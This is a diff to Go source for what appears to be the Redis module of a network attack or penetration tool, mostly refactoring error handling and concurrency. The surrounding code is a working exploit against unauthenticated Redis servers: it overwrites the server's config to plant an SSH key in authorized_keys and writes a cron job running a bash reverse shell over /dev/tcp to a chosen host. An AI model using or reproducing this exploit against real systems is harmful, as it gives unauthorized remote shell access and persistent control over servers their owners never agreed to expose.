@@ -7,15 +7,12 @@ import (
 	"net"
 	"os"
 	"strings"
-	"sync"
 	"time"
 )
 
-func RedisScan(info *common.HostInfo, ch chan int, wg *sync.WaitGroup) {
+func RedisScan(info *common.HostInfo) {
 	flag, err := RedisUnauth(info)
 	if flag == true && err == nil {
-		wg.Done()
-		<-ch
 		return
 	}
 
@@ -27,8 +24,6 @@ Loop:
 			break Loop
 		}
 	}
-	wg.Done()
-	<-ch
 }
 
 func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
@@ -107,7 +102,15 @@ func writekey(conn net.Conn, filename string) (flag bool, text string) {
 		conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename authorized_keys\r\n")))
 		text, _ = readreply(conn)
 		if strings.Contains(text, "OK") {
-			key, _ := Readfile(filename)
+			key, err := Readfile(filename)
+			if err != nil {
+				text = fmt.Sprintf("Open %s error, %v", filename, err)
+				return flag, text
+			}
+			if len(key) == 0 {
+				text = fmt.Sprintf("the keyfile %s is empty", filename)
+				return flag, text
+			}
 			conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
 			text, _ = readreply(conn)
 			if strings.Contains(text, "OK") {
@@ -134,8 +137,8 @@ func writecron(conn net.Conn, host string) (flag bool, text string) {
 		conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename root\r\n")))
 		text, _ = readreply(conn)
 		if strings.Contains(text, "OK") {
-			scan_ip, scan_port := strings.Split(host, ":")[0], strings.Split(host, ":")[1]
-			conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scan_ip, scan_port)))
+			scanIp, scanPort := strings.Split(host, ":")[0], strings.Split(host, ":")[1]
+			conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", scanIp, scanPort)))
 			text, _ = readreply(conn)
 			if strings.Contains(text, "OK") {
 				conn.Write([]byte(fmt.Sprintf("save\r\n")))
@@ -156,8 +159,7 @@ func writecron(conn net.Conn, host string) (flag bool, text string) {
 func Readfile(filename string) (string, error) {
 	file, err := os.Open(filename)
 	if err != nil {
-		fmt.Println("Open %s error, %v", filename, err)
-		return err.Error(), err
+		return "", err
 	}
 	defer file.Close()
 	scanner := bufio.NewScanner(file)
@@ -167,7 +169,7 @@ func Readfile(filename string) (string, error) {
 			return text, nil
 		}
 	}
-	return err.Error(), err
+	return "", err
 }
 
 func readreply(conn net.Conn) (result string, err error) {
